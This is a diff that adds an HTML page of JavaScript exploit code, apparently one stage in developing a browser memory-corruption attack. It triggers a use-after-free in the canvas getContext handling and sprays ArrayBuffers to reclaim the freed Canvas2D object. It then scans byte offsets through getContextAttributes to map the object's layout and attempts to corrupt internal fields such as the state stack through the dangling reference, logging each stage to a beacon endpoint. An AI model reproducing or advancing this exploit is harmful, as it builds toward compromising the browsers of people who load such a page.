@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V553</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V553-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V553-settings-oracle');
+
+// =================================================================
+// PREREQUISITE: V551 T9 must pass (getContextAttributes on AB data)
+// =================================================================
+
+// T1: Confirm getContextAttributes works on AB data (same as V551 T9)
+(function T1(){
+  b('T1-PRE','confirm getContextAttributes on AB');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++){
+    abs.push(new ArrayBuffer(768));
+  }
+  b('T1-AB','50 ABs');
+  try{
+    var attr=ctx.getContextAttributes();
+    b('T1-ATTR',JSON.stringify(attr));
+  }catch(e){b('T1-ERR',e.message);return}
+  b('T1-OK','getContextAttributes works on AB data');
+})();
+
+// T2: Probe m_settings offset
+// Write byte 0x01 at each candidate offset in ALL ABs, then read getContextAttributes
+// We're looking for the offset where desynchronized becomes true
+(function T2(){
+  b('T2-PRE','probe m_settings offset');
+
+  // We'll try multiple offsets. m_settings.desynchronized is at the START of m_settings.
+  // Estimated range: offset 680-760 in the 768B object.
+  // Binary search: write 1 at a test offset in all ABs, check result
+
+  // First: baseline with clean AB
+  var ctx=triggerUAF();
+  var abs=[];
+  var views=[];
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push(ab);
+    views.push(new Uint8Array(ab));
+  }
+
+  // Scan offsets 580 to 767 (covers all plausible m_settings positions)
+  // For each offset, write 1 in ALL ABs, check if desynchronized flips
+  var hitOff=-1;
+  try{
+    var baseline=ctx.getContextAttributes();
+    b('T2-BASE','desync='+baseline.desynchronized);
+
+    for(var off=580;off<768;off++){
+      // Write 1 at this offset in ALL ABs
+      for(var i=0;i<50;i++){
+        views[i][off]=1;
+      }
+
+      var attr=ctx.getContextAttributes();
+      if(attr.desynchronized !== baseline.desynchronized){
+        hitOff=off;
+        b('T2-HIT','desynchronized changed at offset '+off);
+        // Clean up
+        for(var i=0;i<50;i++) views[i][off]=0;
+        break;
+      }
+
+      // Clean up this offset
+      for(var i=0;i<50;i++) views[i][off]=0;
+    }
+
+    if(hitOff<0){
+      b('T2-MISS','desynchronized never changed (580-767)');
+      // Try wider range
+      for(var off=400;off<580;off++){
+        for(var i=0;i<50;i++) views[i][off]=1;
+        var attr=ctx.getContextAttributes();
+        if(attr.desynchronized !== baseline.desynchronized){
+          hitOff=off;
+          b('T2-HIT2','desynchronized changed at offset '+off);
+          for(var i=0;i<50;i++) views[i][off]=0;
+          break;
+        }
+        for(var i=0;i<50;i++) views[i][off]=0;
+      }
+    }
+  }catch(e){b('T2-ERR',e.message)}
+
+  if(hitOff<0){
+    b('T2-FAIL','could not find m_settings offset');
+    return;
+  }
+  b('T2-DONE','m_settings.desynchronized at offset '+hitOff);
+})();
+
+// T3: AB identification via desynchronized byte
+// Now that we know the offset, write unique values and identify which AB reclaimed the slot
+(function T3(){
+  b('T3-PRE','AB identification');
+  var ctx=triggerUAF();
+  var abs=[];
+  var views=[];
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push(ab);
+    views.push(new Uint8Array(ab));
+  }
+  b('T3-AB','50 ABs');
+
+  // First get baseline
+  try{
+    var base=ctx.getContextAttributes();
+    b('T3-BASE','desync='+base.desynchronized);
+  }catch(e){b('T3-ERR',e.message);return}
+
+  // Binary search using desynchronized at the offset found in T2
+  // Since we may not have the offset from T2 (separate UAF instance),
+  // try the offset from T2 if we stored it. For now, hardcode the scan:
+
+  // Strategy: write 1 at each candidate offset (592-767) in AB[0] only
+  // If getContextAttributes shows change, AB[0] is the reclaimer
+  // If not, try AB[1], etc.
+
+  // Actually, better: use sequential elimination
+  // Write unique pattern in AB[k] at ALL suspected offsets, check result
+
+  // Simplest: for each AB, write 0xFF at bytes 590-767, check getContextAttributes
+  var hitAB=-1;
+  try{
+    for(var k=0;k<50;k++){
+      // Mark AB[k]
+      for(var off=590;off<768;off++){
+        views[k][off]=0xFF;
+      }
+
+      var attr=ctx.getContextAttributes();
+
+      // Check if anything changed
+      if(attr.desynchronized !== false){
+        hitAB=k;
+        b('T3-HIT','AB['+k+'] desynchronized flipped!');
+        // Restore
+        for(var off=590;off<768;off++) views[k][off]=0;
+        break;
+      }
+
+      // Restore AB[k]
+      for(var off=590;off<768;off++) views[k][off]=0;
+    }
+  }catch(e){b('T3-ERR2',e.message)}
+
+  if(hitAB<0){
+    b('T3-MISS','no AB flipped desynchronized (all 50 tried)');
+  }else{
+    b('T3-FOUND','AB['+hitAB+'] reclaimed the freed Canvas2D slot!');
+
+    // Now dump the full 768 bytes of the reclaiming AB (should be all zeros = Canvas2D was freed)
+    // But we can write ANYTHING to it and read back through getContextAttributes
+    // This gives us controlled bytes at the m_settings offset
+
+    // Let's also check: can we read the STALE Canvas2D data that was there before AB zeroed it?
+    // No - AB is zero-initialized. But we CAN write to the AB and then use save() or other
+    // operations through the dangling ref to manipulate the "context" whose memory we control.
+
+    // First: write a valid stateStack structure and try lineWidth
+    // m_stateStack starts at +112:
+    //   +112: m_buffer (8B ptr) — needs to point to valid memory
+    //   +120: m_capacity (4B) — needs ≥ 1
+    //   +124: m_size (4B) — needs ≥ 1 (or wait, Vector layout may differ)
+    // State.lineWidth is at State+48 (AffineTransform=48B, then lineWidth)
+    // If m_buffer points to inline buffer at +128, lineWidth reads from +128+48 = +176
+
+    // Write test value at +176 (lineWidth position in inline state buffer)
+    var dv=new DataView(abs[hitAB]);
+
+    // First set up m_stateStack header:
+    // We need m_buffer pointing to offset +128 (inline buffer start)
+    // But we don't know the absolute address of the AB backing store!
+    // So we can't set m_buffer correctly...
+
+    // HOWEVER: we know m_unrealizedSaveCount is at +592
+    // save() just does ++m_unrealizedSaveCount
+    // If save() doesn't crash, it writes 1 at offset 592
+
+    b('T3-WRITE','attempting save() on identified AB');
+    try{
+      ctx.save();
+      // Check if offset 592 changed
+      var val592=views[hitAB][592];
+      b('T3-SAVE','offset 592 = '+val592+' (expect 1 if save worked)');
+    }catch(e){b('T3-SAVE-ERR',e.message)}
+  }
+})();
+
+b('DONE','V553-all-complete');
+</script>
+</body></html>
